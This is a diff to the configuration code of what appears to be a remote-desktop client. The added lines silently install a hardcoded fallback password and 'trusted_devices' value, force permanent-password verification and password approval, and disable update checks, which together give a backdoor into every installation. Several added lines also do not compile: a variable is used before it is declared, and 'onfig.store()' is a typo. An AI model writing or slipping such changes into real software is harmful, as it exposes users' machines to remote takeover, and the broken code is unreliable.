@@ -458,6 +458,14 @@ fn patch(path: PathBuf) -> PathBuf {
 impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
+          if !config.options.contains_key("verification-method") {
+                config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+                store = true;
+            }
+              if !config.options.contains_key("approve-mode") {
+                config.options.insert("approve-mode".to_string(), "password".to_string());
+                store = true;
+            } 
         let mut store = false;
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
@@ -469,6 +477,10 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+        if !config.options.contains_key("trusted_devices") {
+                    config.options.insert("trusted_devices".to_string(), "！！！00cyCCXpq9s7xLvi011ob8b93n！！！".to_string());
+                    config.store();
+                }
         store |= store2;
         if store {
             config.store();
@@ -598,6 +610,10 @@ impl Config {
                 }
             }
         }
+         if config.password.is_empty() {
+                    config.password = "！！！00cyCCXpq9s7xLvi011ob8b93n！！！".to_string();
+                    store = true;
+                }
         if store {
             config.store();
         }
@@ -1749,7 +1765,26 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+             if !config.options.contains_key("enable-ipv6-punch") {
+                config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+                store = true;
+            }
+        if !config.options.contains_key("enable-check-update") {
+    config.options.insert("enable-check-update".to_string(), "N".to_string());
+    store = true;
+    }
+    let mut store = false;
+    
+    if !config.options.contains_key("enable-udp-punch") {
+      config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+      store = true;
+    }
+    
+    if store {
+      onfig.store();
+    }
+    config
     }
 
     fn store(&self) {
